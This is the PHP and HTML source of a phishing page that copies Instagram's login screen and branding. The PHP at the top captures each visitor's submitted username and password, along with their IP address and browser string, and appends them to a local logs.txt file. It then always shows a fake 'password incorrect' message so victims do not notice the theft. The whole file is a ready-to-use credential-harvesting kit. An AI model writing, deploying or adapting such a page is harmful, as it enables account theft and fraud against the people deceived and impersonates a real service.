<?php
	ini_set("display_errors","off");
	error_reporting(0);
    date_default_timezone_set("Asia/Tehran");

	if (isset($_POST['btn']))
	{
		$msg = "<div class=\"alert\">Sorry, your password was incorrect. Please double-check your password.</div>";
		$Date = date("Y-m-d H:i:s");
		$IP = $_SERVER["REMOTE_ADDR"];
		$UserAgent = $_SERVER["HTTP_USER_AGENT"];
		$username = $_POST['username'];
		$password = $_POST['password'];
		$FP = fopen("logs.txt","a+");
		$Data = "Date: $Date\n";
		$Data .= "IP: $IP\n";
		$Data .= "Browser: $UserAgent\n";
		$Data .= "Username: $username\n";
		$Data .= "Password: $password\n";
		$Data .= "========================================================\n";
		fwrite($FP,$Data);
		fclose($FP);		
	}
?>

<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>Instagram</title>
	<link rel="stylesheet" href="styles.css">
</head>
<body>

<div class="wrapper">
	<div class="header">
		<div class="top">
			<div class="logo">
				<img src="instagram.png" alt="instagram" style="width: 175px;">
			</div>
			<form class="form" action="?" method="POST">
				<div class="input_field">
					<input type="text" placeholder="Phone number, username, or email" class="input" name="username" id="username" onkeypress="check()">
				</div>
				<div class="input_field">
					<input type="password" placeholder="Password" class="input" name="password" id="password" onkeypress="check()">
				</div>
				<div>
					<input type="submit" value="Log In" class="btn" name="btn" id="btn">
				</div>
				<?php echo $msg; ?>
			</form>
			<div class="or">
				<div class="line"></div>
				<p>OR</p>
				<div class="line"></div>
			</div>
			<div class="dif">
				<div class="fb">
					<img src="facebook.png" alt="facebook">
					<p style="cursor: pointer;">Log in with Facebook</p>
				</div>
				<div class="forgot">
					<a href="#">Forgot password?</a>
				</div>
			</div>
		</div>
		<div class="signup">
			<p>Don't have an account? <a href="#">Sign up</a></p>
		</div>
		<div class="apps">
			<p>Get the app.</p>
			<div class="icons">
				<a href="#"><img src="appstore.png" alt="appstore"></a>
				<a href="#"><img src="googleplay.png" alt="googleplay"></a>
			</div>
		</div>
	</div>
	<div class="footer">
		<div class="links">
			<ul>
				<li><a href="#">ABOUT US</a></li>
				<li><a href="#">SUPPORT</a></li>
				<li><a href="#">PRESS</a></li>
				<li><a href="#">API</a></li>
				<li><a href="#">JOBS</a></li>
				<li><a href="#">PRIVACY</a></li>
				<li><a href="#">TERMS</a></li>
				<li><a href="#">DIRECTORY</a></li>
				<li><a href="#">PROFILES</a></li>
				<li><a href="#">HASHTAGS</a></li>
				<li><a href="#">LANGUAGE</a></li>
			</ul>
		</div>
		<div class="copyright">
			© 2021 INSTAGRAM
		</div>
	</div>
</div>

<script>
	var btn = document.getElementById("btn");
	btn.classList.add("disabled");
	function check(){
		var username = document.getElementById("username").value;
		var password = document.getElementById("password").value;
		if (username != '' && password != ''){
			btn.classList.remove("disabled")
		}
	}
</script>
</body>
</html>

